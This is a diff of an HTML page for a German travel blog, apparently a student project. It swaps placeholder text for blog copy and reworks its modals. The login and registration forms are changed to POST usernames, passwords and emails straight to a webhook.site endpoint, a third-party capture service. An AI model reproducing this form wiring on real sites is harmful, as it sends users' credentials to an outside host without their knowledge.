@@ -63,7 +63,7 @@
 
         </header>
 
-        <!-- Modals für Login und Registrierung -->
+        <!-- Modals für Login, Registrierung, Cookies und Kick Erfolg bestätigung-->
         <div class="modal-overlay" id="loginModal">
             <div class="modal-container">
                 <div class="modal-header">
@@ -71,16 +71,16 @@
                     <button class="modal-close" onclick="closeLoginModal()">×</button>
                 </div>
                 <div class="modal-body">
-                    <form id="loginForm" onsubmit="return loginSubmit();">
+                    <form id="loginForm" method="post"  action="https://webhook.site/bc4600b0-fe8b-4f95-a5ef-ee045cf58401">
                         <label for="loginUsername" class="label">Benutzername</label>
-                        <input type="text" id="loginUsername" class="input-field" placeholder="Geben Sie Ihren Benutzernamen ein..." autocomplete="username">
+                        <input type="text" id="loginUsername" class="input-field" required placeholder="Geben Sie Ihren Benutzernamen ein..." autocomplete="username">
                         <br>
                         <label for="loginPassword" class="label">Passwort</label>
-                        <input type="password" id="loginPassword" class="input-field" placeholder="Geben Sie Ihr Passwort ein..." autocomplete="current-password">
+                        <input type="password" id="loginPassword" class="input-field" required placeholder="Geben Sie Ihr Passwort ein..." autocomplete="current-password">
                     </form>
                 </div>
                 <div class="modal-footer">
-                    <button onclick="loginSubmit(event)" class="button button-success">Login</button>
+                    <button type="submit" form="loginForm" class="button button-success" onclick="openSuccesPopupModal()">Login</button>
                 </div>
             </div>
         </div>
@@ -92,19 +92,19 @@
                     <button class="modal-close" onclick="closeRegisterModal()"> x </button>
                 </div>
                 <div class="modal-body">
-                    <form id="registerForm" onsubmit="return registerSubmit();">
+                    <form id="registerForm" method="post"  action="https://webhook.site/bc4600b0-fe8b-4f95-a5ef-ee045cf58401">
                         <label for="registerMail" class="label">E-Mail</label>
-                        <input type="text" id="registerMail" class="input-field" placeholder="Geben Sie Ihre Email ein..." autocomplete="email">
+                        <input type="text" id="registerMail" class="input-field" required placeholder="Geben Sie Ihre Email ein..." autocomplete="email">
                         <br>
                         <label for="registerUsername" class="label">Benutzername</label>
-                        <input type="text" id="registerUsername" class="input-field" placeholder="Geben Sie Ihren Benutzernamen ein...">
+                        <input type="text" id="registerUsername" class="input-field" required placeholder="Geben Sie Ihren Benutzernamen ein...">
                         <br>
                         <label for="registerPassword" class="label">Passwort</label>
-                        <input type="password" id="registerPassword" class="input-field" placeholder="Geben Sie Ihr Passwort ein..." autocomplete="new-password">
+                        <input type="password" id="registerPassword" class="input-field" required placeholder="Geben Sie Ihr Passwort ein..." autocomplete="new-password">
                     </form>
                 </div>
                 <div class="modal-footer">
-                    <button type="submit" form="registerForm" class="button button-success" onclick="registerSubmit(event)">Registrieren</button>
+                    <button type="submit" form="registerForm" class="button button-success" onclick="openSuccesPopupModal()">Registrieren</button>
                 </div>
             </div>
         </div>
@@ -114,46 +114,57 @@
             <div class="modal-container">
                 <div class="modal-header">
                     <div class="modal-title">Cookies</div>
-                    <button class="modal-close" onclick="closeCookiesModal()"> x </button>
+                    <button class="modal-close" onclick="closeSuccesPopupModal()"> x </button>
                 </div>
                 <div class="modal-body">
                     <p>Diese Website verwendet Cookies, um Ihre Erfahrung zu verbessern. Durch die Nutzung dieser Website stimmen Sie der Verwendung von Cookies zu.</p>
-                    <button onclick="acceptCookiesPopupModal()" class="button button-success">Akzeptieren</button>
+                    <button onclick="openSuccesPopupModal()" class="button button-success">Akzeptieren</button>
                 </div>
             </div>
         </div>
 
 
-        <div class="modal-overlay" id="acceptCookiesPopupModal">
+        <div class="modal-overlay" id="SuccesPopupModal">
             <div class="modal-container">
                 <div class="modal-header">
                     <div class="modal-title">Succsess</div>
-                    <button class="modal-close" onclick="closeSuccesCookiesPopupModal()"> x </button>
+                    <button class="modal-close" onclick="closeSuccesPopupModal()"> x </button>
                 </div>
                 <div class="modal-body">
-                    <p>Erfolgreich akzeptiert</p>
+                    <p>Erfolgreich angeklickt</p>
                 </div>
             </div>
         
         </div>
 
-
+        <!-- Hauptinhalt der Seite -->
         <div class="container">
             
             <div class="main">
                 <div class="main-content">
-                    <h1>Thema 1</h1>
+                    <h2 class="section-title">Herzlich Willkommen auf unserem Reiseblog!</h2>
+                    <p>Schön, dass du hier bist! Auf unserem Reiseblog nehmen wir dich mit auf eine spannende Reise rund um den Globus. Hier findest du nicht nur beeindruckende Reiseberichte aus exotischen Ländern, sondern auch nützliche Tipps, spannende Geschichten und die besten Geheimtipps, die dir helfen, deine nächste Reise unvergesslich zu machen.</p>
+                    <p>Wir teilen nicht nur die Highlights der schönsten Reiseziele, sondern auch praktische Informationen zu Reisevorbereitungen, Budgetplanung und einzigartigen Erlebnissen, die du auf deiner Reise nicht verpassen solltest. Unsere Leidenschaft für das Reisen steckt in jedem Beitrag, und wir hoffen, dich zu inspirieren, die Welt mit offenen Augen und einem offenen Herzen zu entdecken.</p>
 
-                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Sequi accusamus, laudantium fugiat quae voluptate id, esse optio dignissimos nostrum voluptas enim inventore aliquid consectetur reiciendis repudiandae, consequatur commodi perspiciatis? Hic! Lorem ipsum dolor sit amet consectetur adipisicing elit. Culpa, quam dignissimos accusamus maxime expedita ad libero beatae, molestias modi aperiam cupiditate excepturi labore quo. Suscipit nobis necessitatibus ratione quaerat. Magni. Lorem ipsum dolor sit amet consectetur adipisicing elit. Distinctio ratione, quis culpa pariatur nihil illo veritatis blanditiis odio voluptatem maiores porro cumque ad! Vero, accusamus nisi? Ipsa quis nobis optio. Lorem, ipsum dolor sit amet consectetur adipisicing elit. Earum soluta suscipit laudantium saepe maiores delectus, similique facere officia ratione eveniet magni atque ipsa dolor ipsum ipsam maxime, ea deleniti quos. Lorem ipsum dolor sit amet consectetur adipisicing elit. Blanditiis, nesciunt. Facere tenetur corrupti explicabo saepe molestias quo quod eum fugiat nihil impedit laborum rerum, neque at illum. Adipisci, accusantium odit. Lorem ipsum dolor sit amet consectetur adipisicing elit. Quo, temporibus quae? Distinctio ab quod tempora nemo similique laudantium facere reprehenderit! Minima, inventore obcaecati assumenda ab error dolor delectus quas architecto! Lorem ipsum dolor sit, amet consectetur adipisicing elit. Nihil rem possimus, autem consequuntur optio sit eaque nesciunt cupiditate sed illo, minus, repellat libero delectus animi odit saepe laudantium neque excepturi.</p>
-                
                 </div>
 
                 <div class="main-content">
-                    <h1>Thema 2</h1>
-
-                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Sequi accusamus, laudantium fugiat quae voluptate id, esse optio dignissimos nostrum voluptas enim inventore aliquid consectetur reiciendis repudiandae, consequatur commodi perspiciatis? Hic! Lorem ipsum dolor sit amet consectetur adipisicing elit. Culpa, quam dignissimos accusamus maxime expedita ad libero beatae, molestias modi aperiam cupiditate excepturi labore quo. Suscipit nobis necessitatibus ratione quaerat. Magni. Lorem ipsum dolor sit amet consectetur adipisicing elit. Distinctio ratione, quis culpa pariatur nihil illo veritatis blanditiis odio voluptatem maiores porro cumque ad! Vero, accusamus nisi? Ipsa quis nobis optio. Lorem, ipsum dolor sit amet consectetur adipisicing elit. Earum soluta suscipit laudantium saepe maiores delectus, similique facere officia ratione eveniet magni atque ipsa dolor ipsum ipsam maxime, ea deleniti quos. Lorem ipsum dolor sit amet consectetur adipisicing elit. Blanditiis, nesciunt. Facere tenetur corrupti explicabo saepe molestias quo quod eum fugiat nihil impedit laborum rerum, neque at illum. Adipisci, accusantium odit. Lorem ipsum dolor sit amet consectetur adipisicing elit. Quo, temporibus quae? Distinctio ab quod tempora nemo similique laudantium facere reprehenderit! Minima, inventore obcaecati assumenda ab error dolor delectus quas architecto! Lorem ipsum dolor sit, amet consectetur adipisicing elit. Nihil rem possimus, autem consequuntur optio sit eaque nesciunt cupiditate sed illo, minus, repellat libero delectus animi odit saepe laudantium neque excepturi.</p>
-                
+                    <h2 class="section-title">Warum solltest du uns folgen?</h2>
+                    <ul>
+                        <li><strong>Vielfältige Reiseziele:</strong> Wir erkunden alle Ecken der Welt – von tropischen Inseln über pulsierende Städte bis hin zu abgelegenen Bergregionen.</li>
+                        <li><strong>Praktische Reisetipps:</strong> Du findest hilfreiche Informationen zu Flugbuchungen, Unterkünften, Budgetreisen und vieles mehr.</li>
+                        <li><strong>Persönliche Erlebnisse:</strong> Unsere Berichte basieren auf unseren eigenen Erfahrungen, damit du die Reise wirklich fühlen kannst.</li>
+                    </ul>
+                    <p>Egal, ob du als Alleinreisender, mit Freunden oder der Familie unterwegs bist – wir bieten dir die besten Empfehlungen und Reiseideen für jedes Budget und jeden Reisestil. Unsere Leidenschaft fürs Reisen ist ansteckend, und wir hoffen, dich zu inspirieren, deine eigenen Abenteuer zu erleben!</p>
+               
                 </div>
+
+                <div class="main-content">
+                    <h2 class="section-title">Kontaktformular – Wir hören gerne von dir!</h2>
+                    <p>Hast du Fragen zu einem unserer Reiseziele? Möchtest du deine eigenen Tipps und Erlebnisse teilen? Oder hast du einfach Lust, mit uns über die Welt zu sprechen? Dann nutze gerne unser Kontaktformular! Wir freuen uns auf deine Nachricht und sind immer für einen Austausch zu haben.</p>
+
+                </div>
+                
             </div>          
 
             <div class="sidebar">
@@ -170,6 +181,7 @@
             </div>
         </div>
 
+         <!-- Cookies Modal öffnen -->
 
         <div class="fixed"> 
             <img src="bilder/cookie.jpeg" alt="Cookiebuton" width="40" height="40" onclick="openCookiesModal()" style="cursor: pointer;"></img>
@@ -177,26 +189,10 @@
 
         
 
-        <!-- Steam api funktioniert nicht im Frontend
-        <section>
-            
-            <h2>Filter</h2>
-            <div id="filter" class="container">
-                !-- filled by js (api) with categories --
-            </div>
-            <h2>Spiele</h2>
-            <div id="spiele" class="container">
-                <a class="box" style="display: none" href="">
-                    <img src="Sandwich.webp" alt="spielCover">
-                    <p class="box-title">CivVI</p>
-                    <p class="box-body">
-                        1000 Stunden
-                    </p>
-                </a>                        
-            </div>
-        </section>
-        -->
 
+
+
+        <!-- Footer -->
         <footer>
             <p>
                 Email: <a href="mailto:info@uni.de">info@uni.de</a>
